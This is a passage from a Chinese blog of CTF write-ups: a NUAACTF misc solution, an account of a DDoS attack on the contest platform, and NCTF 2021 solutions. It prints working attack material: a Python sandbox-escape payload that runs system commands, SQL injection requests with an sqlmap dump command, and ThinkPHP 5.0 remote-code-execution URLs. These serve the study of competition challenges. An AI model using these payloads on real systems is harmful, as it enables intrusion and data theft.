++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++++++++++.&gt;+++++++++++.----.------.++++++++.++.-. and should output the ASCII characters Pokemon 其实就是 BrainFuck 换了个编码表（ 直接在网页上执行，得到另一个域名 itismath.vercel.app 访问得到一堆数字，或者说一个矩阵。 [(251, 25711.438), (393, 40195.541), (177, 18162.627), (318, 32544.988), (471, 48151.807), (170, 17448.789), (469, 47947.733), (428, 43765.255), (65, 6738.41), (291, 29790.762), (350, 35809.283), (151, 15510.828), (203, 20815.487), (196, 20101.064), (228, 23365.239), (34, 3576.204), (150, 15408.508), (53, 5514.259), (392, 40092.417), (212, 21732.801), (226, 23160.389), (362, 37032.44), (314, 32137.56), (283, 28975.046), (437, 44683.716), (463, 47335.627), (176, 18060.901), (182, 18672.449), (245, 25098.485), (322, 32953.074)] [(315, 30659.028), (79, 7766.519), (349, 33957.654), (294, 28622.323), (399, 38806.382), (40, 3983.567), (54, 5341.251), (313, 30464.785), (135, 13198.723), (483, 46955.973), (391, 38032.457), (71, 6990.395), (51, 5050.41), (311, 30271.461), (457, 44432.214), (392, 38128.872), (320, 31143.177), (258, 25129.776), (472, 45887.894), (18, 1849.403), (206, 20085.75), (442, 42978.708), (195, 19018.715), (74, 7281.578), (306, 29785.452), (116, 11355.545), (491, 47730.532), (172, 16787.549), (52, 5147.612), (316, 30756.23)] [(418, 51471.916), (432, 53194.178), (67, 8298.618), (470, 57869.16), (473, 58237.061), (78, 9651.542), (350, 43108.093), (24, 3009.174), (57, 7068.255), (45, 5592.309), (132, 16293.547), (312, 38433.309), (111, 13710.512), (196, 24165.246), (162, 19983.339), (113, 13956.568), (249, 30685.306), (466, 57377.563), (76, 9405.55), (456, 56145.491), (381, 46920.932), (32, 3993.124), (61, 7560.342), (22, 2763.37), (200, 24657.32), (332, 40895.039), (20, 2517.183), (339, 41754.346), (7, 918.143), (427, 52579.973)] [(491, 33442.231), (458, 31197.978), (175, 11952.617), (415, 28273.888), (59, 4064.374), (384, 26165.806), (461, 31401.368), (114, 7804.803), (298, 20316.548), (259, 17665.479), (7, 528.412), (314, 21404.044), (256, 17460.416), (353, 24056.761), (243, 16577.595), (422, 28748.164), (332, 22628.649), (421, 28681.826), (313, 21337.49), (156, 10660.488), (202, 13789.358), (198, 13516.644), (151, 10320.372), (216, 14741.23), (291, 19841.042), (288, 19637.266), (425, 28954.543), (91, 6240.096), (434, 29565.843), (355, 24192.317)] [(72, 7400.724), (79, 8114.246), (179, 18314.96), (322, 32901.375), (433, 44223.767), (245, 25047.021), (399, 40754.275), (491, 50139.317), (125, 12806.721), (182, 18620.374), (259, 26475.651), (325, 33207.992), (463, 47283.006), (368, 37593.175), (427, 43612.087), (291, 29738.352), (213, 21782.567), (442, 45142.345), (16, 1688.087), (283, 28923.066), (305, 31166.391), (339, 34635.62), (167, 17090.158), (223, 22802.122), (416, 42489.428), (10, 1076.395), (489, 49935.196), (449, 45855.695), (371, 37898.19), (94, 9644.64)] [(116, 11764.956), (494, 49944.273), (303, 30651.417), (451, 45600.484), (408, 41257.93), (422, 42672.458), (19, 1967.13), (102, 10350.819), (496, 50146.609), (347, 35096.092), (228, 23076.577), (186, 18835.061), (270, 27318.813), (53, 5401.371), (421, 42570.209), (407, 41157.05), (317, 32066.904), (276, 27925.013), (259, 26207.727), (453, 45801.337), (446, 45095.346), (166, 16814.285), (323, 32672.829), (178, 18026.726), (60, 6108.255), (12, 1260.339), (29, 2977.287), (450, 45498.85), (492, 49741.281), (218, 22066.439)] [(370, 37785.878), (278, 28401.607), (166, 16977.836), (224, 22894.401), (26, 2697.274), (110, 11265.689), (39, 4023.362), (379, 38703.214), (249, 25443.357), (266, 27178.394), (204, 20853.983), (179, 18303.84), (474, 48394.45), (444, 45334.086), (254, 25954.622), (420, 42885.767), (338, 34522.488), (22, 2289.323), (58, 5961.562), (15, 1575.394), (315, 32175.988), (29, 3003.186), (17, 1779.083), (465, 47477.351), (119, 12183.245), (363, 37072.61), (19, 1983.228), (395, 40336.878), (164, 16773.53), (380, 38805.324)] [(254, 12543.323), (44, 2253.348), (236, 11662.079), (395, 19453.074), (91, 4556.232), (315, 15532.771), (439, 21608.869), (32, 1665.213), (380, 18719.16), (272, 13425.484), (27, 1420.445), (356, 17543.092), (371, 18277.529), (353, 17395.328), (295, 14553.08), (338, 16659.262), (183, 9065.033), (374, 18424.299), (142, 7055.199), (234, 11564.408), (8, 489.253), (98, 4899.279), (120, 5977.687), (302, 14895.733), (390, 19208.331), (267, 13181.005), (423, 20825.516), (156, 7741.71), (122, 6075.745), (21, 1126.293)] [(150, 8016.821), (227, 12098.139), (261, 13900.307), (162, 8652.414), (95, 5101.549), (272, 14483.247), (43, 2345.185), (63, 3405.18), (476, 25294.643), (294, 15648.955), (481, 25560.142), (219, 11673.944), (163, 8705.953), (7, 437.04), (466, 24764.492), (147, 7857.726), (36, 1974.507), (490, 26038.59), (202, 10773.071), (330, 17556.469), (467, 24819.432), (23, 1285.311), (32, 1762.25), (85, 4571.556), (374, 19889.562), (355, 18882.738), (72, 3882.575), (48, 2610.335), (329, 17504.714), (364, 19358.515)] [(257, 14718.98), (475, 27144.037), (81, 4686.244), (109, 6282.843), (361, 20647.935), (50, 2919.492), (135, 7764.347), (21, 1266.265), (216, 12382.091), (430, 24580.106), (491, 28057.66), (87, 5028.474), (19, 1152.178), (382, 21844.316), (104, 5997.644), (232, 13293.29), (416, 23783.295), (342, 19564.978), (18, 1095.401), (176, 10102.126), (309, 17682.211), (157, 9019.065), (54, 3147.231), (158, 9076.081), (69, 4002.583), (127, 7308.433), (379, 21673.285), (431, 24638.424), (473, 27030.564), (90, 5199.474)] [(420, 21473.665), (265, 13568.853), (355, 18158.695), (301, 15405.389), (443, 22646.266), (120, 6173.475), (24, 1277.359), (305, 15609.581), (380, 19433.319), (229, 11733.252), (52, 2705.139), (410, 20964.551), (91, 4694.106), (266, 13620.62), (307, 15711.523), (459, 23463.426), (213, 10916.687), (180, 9233.946), (236, 12089.643), (376, 19230.199), (440, 22494.488), (125, 6428.384), (31, 1634.331), (426, 21781.387), (153, 7856.98), (340, 17393.99), (33, 1736.392), (252, 12905.881), (386, 19739.766), (172, 8825.891)] [(342, 15488.351), (135, 6172.774), (459, 20752.223), (358, 16207.357), (478, 21608.604), (103, 4732.814), (137, 6262.325), (269, 12203.375), (349, 15802.51), (411, 18594.199), (256, 11618.489), (270, 12248.129), (26, 1267.293), (17, 862.047), (361, 16342.428), (319, 14453.75), (427, 19312.302), (88, 4057.426), (328, 14859.053), (476, 21518.765), (399, 18053.591), (149, 6802.205), (28, 1357.121), (201, 9142.807), (50, 2347.035), (470, 21248.937), (97, 4462.399), (66, 3067.299), (344, 15578.997), (374, 16927.668)] [(212, 21514.787), (184, 18686.931), (415, 42017.302), (140, 14242.375), (275, 27877.595), (479, 48482.414), (441, 44645.368), (166, 16868.404), (205, 20807.994), (257, 26059.839), (360, 36463.631), (15, 1617.407), (357, 36159.891), (35, 3637.187), (255, 25858.387), (12, 1314.057), (288, 29191.522), (390, 39493.551), (267, 27069.547), (492, 49795.329), (269, 27271.675), (470, 47573.564), (347, 35149.842), (408, 41311.623), (71, 7273.644), (142, 14444.819), (456, 46158.953), (174, 17676.401), (474, 47977.879), (280, 28383.58)] [(404, 19495.358), (12, 678.245), (270, 13062.555), (237, 11478.449), (283, 13687.52), (248, 12006.987), (94, 4614.53), (419, 20214.805), (61, 3030.327), (21, 1110.239), (482, 23240.86), (49, 2454.045), (382, 18439.282), (426, 20550.769), (221, 10710.661), (155, 7542.195), (416, 20071.565), (55, 2742.353), (276, 13351.515), (271, 13110.676), (152, 7398.707), (405, 19542.495), (57, 2838.079), (101, 4950.13), (316, 15270.601), (459, 22135.203), (183, 8886.061), (193, 9366.336), (319, 15415.446), (344, 16615.058)] [(327, 21683.004), (138, 9208.802), (495, 32770.797), (488, 32308.797), (385, 25512.246), (21, 1486.417), (92, 6172.598), (394, 26106.215), (366, 24257.571), (115, 7690.604), (258, 17129.751), (299, 19834.484), (110, 7360.251), (252, 16732.208), (392, 25973.952), (260, 17260.445), (447, 29602.432), (335, 22212.109), (332, 22012.98), (424, 28084.729), (68, 4588.479), (98, 6568.411), (402, 26632.436), (353, 23399.551), (204, 13565.172), (113, 7558.401), (274, 18184.341), (193, 12838.195), (342, 22673.414), (361, 23927.43)] [(20, 1098.278), (455, 22848.531), (131, 6648.615), (488, 24500.666), (48, 2498.193), (276, 13899.408), (28, 1498.131), (86, 4398.853), (196, 9898.668), (326, 16398.231), (381, 19148.7), (63, 3248.501), (27, 1448.238), (386, 19399.918), (240, 12098.565), (239, 12048.603), (293, 14749.701), (363, 18248.92), (172, 8698.375), (181, 9148.851), (340, 17099.405), (265, 13349.585), (389, 19548.138), (469, 23548.322), (401, 20148.573), (353, 17749.481), (441, 22150.277), (163, 8248.245), (62, 3198.467), (436, 21899.306)] [(341, 23924.127), (184, 12933.254), (281, 19723.718), (428, 30013.631), (176, 12373.595), (364, 25533.587), (205, 14403.129), (60, 4253.335), (487, 34145.59), (112, 7893.573), (78, 5513.743), (472, 33094.006), (95, 6703.269), (199, 13984.079), (98, 6913.618), (66, 4673.34), (196, 13773.778), (104, 7333.186), (169, 11883.735), (274, 19234.415), (194, 13634.025), (266, 18673.773), (258, 18114.224), (166, 11673.939), (59, 4183.159), (413, 28964.462), (210, 14753.414), (155, 10903.648), (303, 21264.794), (390, 27353.912)] [(266, 17416.256), (417, 27231.231), (226, 14815.612), (154, 10135.945), (387, 25281.883), (232, 15205.465), (239, 15660.331), (17, 1230.284), (68, 4545.643), (20, 1425.137), (168, 11045.438), (93, 6170.171), (166, 10915.611), (26, 1815.332), (426, 27816.6), (81, 5390.485), (183, 12020.856), (156, 10265.989), (463, 30221.854), (45, 3050.258), (257, 16830.757), (271, 17740.921), (345, 22551.32), (289, 18910.733), (198, 12996.069), (332, 21705.53), (485, 31652.224), (203, 13320.834), (295, 19301.314), (14, 1035.21)] 18 行数据，每行一个 list，里面包含 30 个 tuple。 结合题目名字和描述 ItIsMath，应该就是和数学有点关系，把数据当成坐标点，画一画可以发现每一行的点连起来都近似一条直线。 后面也提示了是线性回归。 于是建立一个线性回归模型，依次算出每条直线的斜率和截距，然后 round 取个整，转化为 ASCII，拼起来就是 flag。 Exp: from sklearn.linear_model import LinearRegression import numpy as np with open('data.txt') as f: a = f.read().splitlines() a = [eval(x) for x in a] ans = [] for i in range(len(a)): xx, yy = list(zip(*a[i])) xx = np.array(xx).reshape(-1, 1) yy = np.array(yy) linear_regression = LinearRegression(normalize=True) linear_regression.fit(xx, yy) message = linear_regression.coef_[0] print(message) ans.append(round(message)) y = linear_regression.intercept_ ans.append(round(y)) print(bytes(ans)) 得到 flag flag{9D4f8e0f-1a5B9E35-aef0fBd2bF5A} 当然也可以直接用 numpy 的 polyfit 来 import numpy as np with open('data.txt') as f: a = f.read().splitlines() data = [eval(x) for x in a] for points in data: x = [_[0] for _ in points] y = [_[1] for _ in points] x = np.array(x) y = np.array(y) k, b = np.polyfit(x, y, 1) print(chr(int(k)), end='') print(chr(int(b)), end='') 出题思路这题其实是比赛前一天晚上到比赛当天凌晨出的。本来这题是可有可无的，毕竟 misc 题目已经不少了，可是喵喵想着就出了一题太少了，虽然那道题放在校赛可能有点难，但万一被秒了可不好，再出道难一点的吧。 这题题目描述里的 Do you remember the last NUAACTF? ，其实是因为上一届 NUAACTF （在今年上半年，好像是因为疫情延期了，233）出了一题也用到了域名 TXT 记录的，这里相当于回顾一下。 之所以 TXT 里放 base32，是因为之前出题有过某些情况下解析出来大小写会锅，而 base32 的话字母全是大写的就不存在这个问题了。 至于 pikachu，当然 ta 是可爱啊，喵喵说是随意找然后正好看到的你信不信呢？确实是这样。 这个 pikachu 在原来的域名执行的结果是 ctf.asuri.club:xxxxx，也就是平台上的一个端口，访问得到的是和 https://itismath.vercel.app/ 几乎一样的结果，但由于比赛的时候服务器被 DDoS 攻击了，之后救回来系统重启了，虽然配了 restart=always，不知道为啥部署的容器还是没了，考虑到稳定性和可靠性干脆直接一键部署到 vercel 好了。相应地也就换了个域名，为了让选手不白做题，就说能解出原来的域名也直接给下一步了。 最后就是题目里说的 Math 了，线性回归，算是比较简单能想到的一个数学应用吧，甚至为了简单给相应系数加的噪声（随机数）都极小，这个拟合结果貌似都 R^2=1 了（好像是吧，懒得再看了 不过由于前面的步骤有点绕，比赛的时候问了选手进度，然后即使是疯狂放 hint，最后也只有一队校外的出了，校内也有一两队到线性回归这步骤但没时间解了，还是挺可惜的吧。 运维故事这里大概简单粗略地复盘一下吧。 最大的体会就是 题目和平台一定别放同一台机器上面，被 DDoS 就一起完蛋！ 没错，毕竟之前西工大还是哪个学校校赛就有过被 D 的情况，赛后交流就说最好是靶机和平台分离。 我们办比赛第一次尝试使用动态靶机，用了 Docker + CTFd-Whale，给每个团队分了独立的环境和动态 flag，防止被搅屎，也比较公平，能开动态的题目都尽量开了。 一开始喵喵就和队里师傅说了别放一台机器上的，咱本来也就出个题的事，已经不该管平台这种事情了，结果比赛前几天问了下，队里师傅临时买了个 4c8G 的机器，没搭多机器分布式啥的，甚至题目都是比赛前一两天测试怎么部署的，摸了。 其实本来赛前还问了 THUCTF 那边的师傅要了他们分布式的部署方案，喵喵看了，以为队友也拿到了，最后比赛前几天问了才发现没有，啊喵喵也有锅。（（（逃 比赛前一天晚上，喵喵来测试了一下平台，一看咋啥也没跑内存占用都到 6G 了，ctfd 开动态靶机果然消耗不少资源啊。还在担心顶不顶得住，然后重启了一下，内存占用稍微小了一点，应该还好吧。（当晚喵喵还在思考要不要开个临时备用机器或者整个校内的服务器应急用，然而实际上没准备 当晚喵喵发现带宽不大行，加载图片啥的贼慢，原来首页大图放的是个十几 MiB 的原图，得加载几十秒，于是就让队里师傅压缩了一下，然后把原来放平台上的附件尽量转移到其他存储了。 结果第二天比赛果然带宽不行，开场直接卡死，发现原来带宽才 5Mbps，最后临时扩容到 50Mbps 才顺畅了。也好在因为及时转移了附件，在平台不能用的时候至少还能让选手看看题（ 嗯，比赛进行着，到了下午四点多，突然一下平台上不去了，ssh 连接断了，啊，是 DDoS！ 啊，还是反射 ntp 的那种！根本来不及拦，瞬间被腾讯云黑洞了。 然后瞬间懵逼了，ping 不通，ssh 上不去，最后咱让队友上腾讯云去起 vnc 看看，800+ Mbps 瞬时流量就离谱啊！一个校赛而已，哪位大佬还花钱买 DDoS 服务啊…… 也靠队里热心学长白神来运维，开了直播看着实时排行榜和服务器状态（上面截图），以及帮忙处理被 DDoS 之后的应急。 由于原来的 IP 被黑洞了，腾讯云也不然开也不让换，最后解决方案是加了个 IP，配适配器路由啥的。 噢，还把带宽开到了 100Mbps（ 最后再改 DNS 解析，改平台上的配置和题目描述，有些环境没了的重新起一下，看了没啥问题之后，重新开放了平台。 大概一个小时过去了，商量了一下，比赛延长一个小时。 之后就一切平稳，比赛顺利结束。 另外，当天还有其他学校办算法比赛，平台也被 D 了，又想到之前某校赛被打之后只对校内开放了，也有某比赛比着比着被打之后把所有 web 题目都下线了且不再上线了大家做其他题目去吧（笑死 所以最好的方案其实还是 平台和靶机分离，平台尽量套个 CDN 缓存静态资源，隐藏真实 IP 且在一定程度上预防 DDoS，靶机的话可以放内网服务器，然后通过 frp 之类的穿透出去，当然带宽也得要保证才行。可以的话机器放内网，紧急情况下保证校内还能访问到平台和靶机。平台数据也要定期备份，最好还是多机备份（异地容灾是吧 2333 小结以上就是喵喵出的两道题的官方题解啦！ 本来以为校外选手至少能有三四解的，结果最后疯狂放 hint 的情况下每道题只有1解，可能出得有点难，或者比赛时间不大够吧，6h 三个人一队属实有点难了。 比赛那天和美团 CTF、字节 ByteCTF final 冲突了，导致校赛校外也没什么师傅来玩，嘤嘤嘤。 这次队里师傅出的题目还是挺顶的，耗子锅锅出了两道游戏题目逆向，写了挺久的吧还是很辛苦的，虽然最后是零解罢了。qrzbing 师傅出了《我们生活在南京》系列无线电的题目，致敬第 32 届中国科幻银河奖“最佳网络科幻奖”小说《我们生活在南京》，也是挺有意思的。 Web 的话，陆队出了一道前几天爆出来的 Grafana 目录穿越任意文件读取 1day，CVE-2021-43798，当作 真的签到。以及一道冷门语言 crystal 以及 normalize 函数半角全角绕过，也是比较能考察能力的（零解）。 Pwn 的话，出题师傅一上来就堆了，说真的不难，噢，喵喵不懂，但大受震撼。最后除了两道题有解其他全是零解，还是有点顶。 Crypto 的话，貌似除了最后一题其他一上来就被师傅们秒了，啊，喵喵不懂，但大受震撼。 最后的解题情况如图所示。 另外，校赛官方题解 以及 大部分题目 陆续开源在 Asuri 战队的 GitHub 上，详情可以移步 https://github.com/Asuri-Team/NUAACTF2021-Challenges/ 有需要的师傅可以上去看看 writeup 复现一下。 最后，感谢各位师傅来玩，希望大家也玩得愉快！有机会下次再来喵~ 也欢迎来我博客转转噢~ （溜了溜了喵~","path":"2021/12/16/CTF_2021AsuriCTF_NUAACTF_Misc/"},{"title":"CTF | 2021 NCTF/NJUPTCTF WriteUp","text":"本文首发于安全客： https://www.anquanke.com/post/id/263036 （u1s1，今年的比赛图做的好简陋啊 引言 参赛对象 ：分为校内队伍和校外队伍，其中校内队伍指由南京邮电大学在读学生所组成的队伍。 参赛要求 ：本次比赛以队伍形式报名参赛，每队至多四人。 报名开始日期 ：11月22日 报名截止日期 ：11月26日 比赛时间 ：11月27日9：00——11月28日21：00 举行方式 ：线上比赛 https://nctf.h4ck.fun 一年一度的 NCTF 又来了。是南邮的校赛啦。 可以回顾一下去年的 Writeup： CTF | 2020 NCTF/NJUPTCTF 部分WriteUp 看到校外队伍今年前六有钱（京东卡）拿，前十就有礼品了，想起来去年还水了个第六，应该还是挺有希望的。 于是就拉上几个小伙伴 w00d, l1nk, FantasqueX，组了个 猫鼠大战 战队，报名来玩了。 说实话也就是随意看看题，喵喵主要看的 Misc 和 Web 题目，Pwn 和 Reverse 是队友做的。 题目好难，嘤嘤嘤。 Misc签到复制粘贴 NCTF{Welcome_to_NCTF_2021!} Hex酱的秘密花园 题目描述: 我们可爱的Hex酱又有了一个强大的功能，可以去执行多行语句惹~ 但是为了防止有些居心叵测的人，我们专门把括号，单双引号，都过滤掉，噢对不准色色，所以也不准出现h哟~ Ubuntu Python3.6.9 快去找Hex酱(QQ:2821876761)私聊吧 附件： https://nctf.slight-wind.com/misc/hex/runner.py https://attachment.h4ck.fun:9000/misc/hex/runner.py runner.py import sys from base64 import b64decode code = sys.argv[1] try: data = b64decode(code.encode()).decode() except: exit(0) for c in 'h\"\\'(': if c in data: exit(0) exec(data) u1s1，过滤了其他的都好说，多多少少在 Flask SSTI 或者其他用到 python 命令执行绕过的场合都见的很多了。然而把小括号 ( 过滤了，那就真没见过了。 比赛的时候网上找了一堆，都说过滤了小括号就执行不了函数了，所以基本无解。 于是想了一天都没想到要怎么绕过这个，唉，还是太菜了……（或者说需要对 python 了解比较多，且要有点脑洞才行了 难道真的没法绕过嘛？不是的。 这里要用到的是 python 里的函数装饰器，也就是 @ 用法，@ 符号就是装饰器的语法糖。 廖雪峰的 python 教程——装饰器 def log(func): print(\"%s is running\" % func.__name__) func() @log def foo(): print(\"i am foo\") 执行 foo 就相当于执行下面这个之后的 foo 函数了。 foo = log(foo) 而且装饰器是可以嵌套的。 由于没有 ban os 这些关键字，可以直接 import 进来拿来用。 而字符的话，由于不能用引号，所以可以用 __doc__ 从一些对象的 docstrings 文档里通过下标来取。这个要注意相应的 python 版本，这题环境是 Ubuntu Python3.6.9。 （这里推荐用 pyenv 来玩 另外，可以执行多行命令。由于不能用 (，不能构造函数了，但还可以构造对象。 其实这里只需要执行系统命令就行，也就是 system(xxx). 一步步来，先用文档构造字符串 n = {}.__doc__ s = 'ls' s = 'cat flag' for i in s: try: idx = n.index(i) except: idx = 'error' print(i, '===&gt;', idx) # l ===&gt; 69 # s ===&gt; 97 # # c ===&gt; 2 # a ===&gt; 27 # t ===&gt; 3 # ===&gt; 6 # f ===&gt; 75 # l ===&gt; 69 # a ===&gt; 27 # g ===&gt; 42 试了试发现 class 里其实啥都行，比如 object, list, int 都行，反正也就是应付个匿名函数的变量罢了（？）。甚至 pass 也行，这么说其实也就是为了满足 class 创建的语法要求吧。 于是喵喵构造的 payload 就是 from os import system n = {}.__doc__ l = lambda _: n[69]+n[97] # ls f = lambda _: n[2]+n[80]+n[55]+n[6]+n[75]+n[69]+n[80]+n[88] # cat flag @system @f class x:pass 实际上执行的就是 system((lambda _:'cat flag')(x)) 成功啦！ 再看官方 wp，这个就更一般化了。 b=[].__class__.__base__.__class__.__subclasses__ d=[].__doc__ n={}.__doc__ _=lambda _:[].__class__.__base__ @b @_ class s:_ l=s[69] q=lambda _:d[66]+d[2] p=lambda _:n[2]+n[80]+n[55]+n[6]+n[75]+d[0]+n[80]+n[88] @l.load_module @q class o:_ @o.system @p class w:_ 详见喵喵的注释。 b=[].__class__.__base__.__class__.__subclasses__ # &lt;method '__subclasses__' of 'type' objects&gt; 也就是 type.__subclasses__ d=[].__doc__ # \"list() -&gt; new empty list\\nlist(iterable) -&gt; new list initialized from iterable's items\" n={}.__doc__ # \"dict() -&gt; new empty dictionary\\ndict(mapping) -&gt; new dictionary initialized from a mapping object's\\n (key, value) pairs\\ndict(iterable) -&gt; new dictionary initialized as if via:\\n d = {}\\n for k, v in iterable:\\n d[k] = v\\ndict(**kwargs) -&gt; new dictionary initialized with the name=value pairs\\n in the keyword argument list. For example: dict(one=1, two=2)\" _=lambda _:[].__class__.__base__ # &lt;class 'object'&gt; @b @_ class s:_ # s =&gt; type.__subclasses__(object) 是个包含各种class的list l=s[69] # &lt;class '_frozen_importlib.BuiltinImporter'&gt; q=lambda _:d[66]+d[2] # os p=lambda _:n[2]+n[80]+n[55]+n[6]+n[75]+d[0]+n[80]+n[88] # cat flag @l.load_module @q class o:_ # o =&gt; &lt;module 'os' (built-in)&gt; @o.system @p class w:_ 一步步加载模块 load_module os，最后利用其中的 system 执行 cat flag。 另外找资料的时候还有一些神奇的发现，列在下面了。 Extensive Readings: Python模板注入(SSTI)深入学习 总结 - CTF中的SSTI0x01 里面总结了好多种过滤字符的绕过方法 浅析SSTI(python沙盒绕过) 郁离歌丶的 python安全之学习笔记（一） python沙盒逃逸，任意命令执行的一些函数和模块，balabala [译]PlaidCTF中一道PyJail逃逸题目分析 python2 中 x 和 repr(x) 完全等价，这题仅仅通过 set([':', '%', \"'\", '', '(', ',', ')', '}', '{', '[', '.', ']', '&lt;', '_', '~']) 中的字符来获得代码。利用符号通过 True False 来创造数字，再通过切片得到字符。感觉有点类似与 Brainfuck 了。 一道有趣的pyjail题目分析 用 Unicode 绕过，在 python3 中支持 Non-ASCII Identifies 并且所有都会被转换成 unicode 的NFKC 也就是标准模式。unicode字符大全 Python黑魔法-[]绕过空格实现变量覆盖 过滤等号时用 for 循环覆盖变量，过滤空格时用 list 生成器和中括号。可以先把过滤的变量给覆盖掉，再 RCE 或者读文件什么的。 &gt;&gt;&gt; a = 0 &gt;&gt;&gt; for a in [1]: ... pass ... &gt;&gt;&gt; a 1 &gt;&gt;&gt; a = 0 &gt;&gt;&gt; [[str][0]for[a]in[[1]]] [&lt;type 'str'&gt;] &gt;&gt;&gt; a 1 Hello File Format 题目描述: aiQG_ is learning to develop programs for macOS GPU. He got a file from the GPU, but he couldn't read it. Can you translate this file for him? 附件链接: 链接：https://pan.baidu.com/s/1swBiyWrAx33M8DDJh7LtNQ 提取码：uo1v https://wwn.lanzoui.com/ix6wXwyi0ih hint: aiQG_ wanted to render one frame of 1920*1080 一个 bin 文件，里面巨多的 0xff 总长度 0x5EEC00，提示说他在渲染一张 1920*1080 的图，除一下发现正好是3倍长度，很明显是 RGB 了。 Exp: # &gt;&gt;&gt; 1920*1080 # 2073600 # &gt;&gt;&gt; hex(1920*1080) # '0x1fa400' # &gt;&gt;&gt; 0x5EEC00/0x1fa400 # 3.0 from PIL import Image with open('GPU data.bin', 'rb') as f: s = f.read() l = [(s[i], s[i+1], s[i+2]) for i in range(0, len(s), 3)] img = Image.new('RGB', (1920, 1080)) img.putdata(l) # img.show() img.save('GPU data.png') # NCTF{TGA_NOT_GTA} ![GPU data](CTF_2021NCTF/GPU data.png) 看了官方 wp 说这个是 tga 格式 TGA files commonly have the extension “.tga” on PC DOS/Windows systems and macOS (older Macintosh systems use the “TPIC” type code). The format can store image data with 8, 15, 16, 24, or 32 bits of precision per pixel[3] – the maximum 24 bits of RGB and an extra 8-bit alpha channel. Color data can be color-mapped, or in direct color or truecolor format. Image data may be stored raw, or optionally, a lossless RLE compression similar to PackBits can be employed. This type of compression performs poorly for typical photographic images, but works acceptably well for simpler images, such as icons, cartoons and line drawings. 做题做累了来玩玩游戏吧 题目描述： 做了一天的题目，都累了吧，快来玩玩我新写的飞机大战吧，只要通关就能获得flag哟～ 对了，如果你真的想玩游戏，也许你需要一个mac，Intel和Apple silicon芯片都支持 附件链接： https://attachment.h4ck.fun:9000/misc/PlaneFire.app.tar.gz https://upyun.clq0.top/PlaneFire.app.tar.gz https://nctf.slight-wind.com/misc/PlaneFire.app.tar.gz 好像是个 unity 的游戏，题目说要用 mac，Intel 和 Apple silicon 芯片都支持才能玩游戏，可恶啊！ 不如直接去资源文件里翻垃圾 很好。 Webezsql 题目描述: 这还能注入吗 http://129.211.173.64:3080/login.php 附件链接： http://129.211.173.64:3080/www.zip login.php //... &lt;?php if (isset($_POST['password'])){ $query = db::prepare(\"SELECT * FROM `users` where password=md5(%s)\", $_POST['password']); if (isset($_POST['name'])){ $query = db::prepare($query . \" and name=%s\", $_POST['name']); } else{ $query = $query . \" and name='benjaminEngel'\"; } $query = $query . \" limit 1\"; $result = db::commit($query); if ($result-&gt;num_rows &gt; 0){ die('NCTF{ez'); } else{ die('Wrong name or password.'); } } //... DB.php &lt;?php class DB{ private static $db = null; public function __construct($db_host, $db_user, $db_pass, $db_database){ static::$db = new mysqli($db_host, $db_user, $db_pass, $db_database); } static public function buildMySQL($db_host, $db_user, $db_pass, $db_database) { return new DB($db_host, $db_user, $db_pass, $db_database); } public static function getInstance(){ return static::$db; } public static function connect_error(){ return static::$db-&gt;connect_errno; } public static function prepare($query, $args){ if (is_null($query)){ return; } if (strpos($query, '%') === false){ die('%s not included in query!'); return; } // get args $args = func_get_args(); array_shift( $args ); $args_is_array = false; if (is_array($args[0]) &amp;&amp; count($args) == 1 ) { $args = $args[0]; $args_is_array = true; } $count_format = substr_count($query, '%s'); if($count_format !== count($args)){ die('Wrong number of arguments!'); return; } // escape foreach ($args as &amp;$value){ $value = static::$db-&gt;real_escape_string($value); } // prepare $query = str_replace(\"%s\", \"'%s'\", $query); $query = vsprintf($query, $args); return $query; } public static function commit($query){ $res = static::$db-&gt;query($query); if($res !== false){ return $res; } else{ die('Error in query.'); } } } ?&gt; config.php &lt;?php $db_host = \"db\"; $db_user = \"mysql\"; $db_pass = \"mysql123\"; $db_database = \"2021\"; include 'DB.php'; DB::buildMySQL($db_host, $db_user, $db_pass, $db_database); if(db::connect_error()){ die('Error whiling connecting to DB'); } ?&gt; 参考 Hack.lu CTF 2021 Diamond Safe 一题的一部分，几乎是原题吧。 由于用了两次 db::prepare，而第二次直接拼接了之前的 $query，于是可以在第一次的时候 password 参数传 %s，而后在第二次通过数组传 name，从而依次给两个 %s 赋值，这样就能实现 sql 注入了。 payload: POST /login.php HTTP/1.1 Host: 129.211.173.64:3080 Content-Length: 62 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http://129.211.173.64:3080 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://129.211.173.64:3080/login.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close password=%s&amp;name[0]=)+or+1%3d1+union+select+1,2,3--+&amp;name[1]=a 得到第一部分flag：NCTF{3v3ryth1ng_ 提示说另一部分在数据库里。 然后拿 sqlmap 盲注一下 name[0] 参数就行。这里是时间盲注，布尔盲注应该也行。要是二分法更快了。 Payload: password=%s&amp;name[0]=) AND (SELECT 8543 FROM (SELECT(SLEEP(5)))zAnj)-- kVPP&amp;name[1]=a 发现 flag 在 2021 数据库下的 NcTF 表里，列名为 fl@g。 这个 fl@g 要拿反引号包一下，不然就全是 NULL 了。 sqlmap -r payload.txt --random-agent -p \"name[0]\" -D 2021 -T NcTF -C '`fl@g`' --dump -v 得到 not_fantast1c_:)} NCTF{3v3ryth1ng_not_fantast1c_:)} 摆就完事了 题目描述： 啊对对对 太对辣太对辣 target 1: http://129.211.173.64:8085/public/index.php/index/index/indextarget 2: http://47.101.160.205:8085/public/index.php/index/index/index 备注： if you get no idea about the problem,there is no harm in diffing the source code with the official one. ThinkPHP v5.0.16 www.zip 有源码 不过发现直接拿那个经典 RCE 的来打就行。 http://129.211.173.64:8085/public/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 http://129.211.173.64:8085/public/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat${IFS}/flag 或者找个现成工具（ nctf{m1saka_wanna_kaibai} 摆就完事了2.0 题目描述：卷起来 不准摆！target: http://129.211.173.64:8086/public/index.php/index/index/index 这题也给了 www.zip 源码。 和上面一题源码 diff 一下。 可以发现把那个 RCE 的给修了，而且给了个 ffllaagg.php，应该就是要读这个文件了。 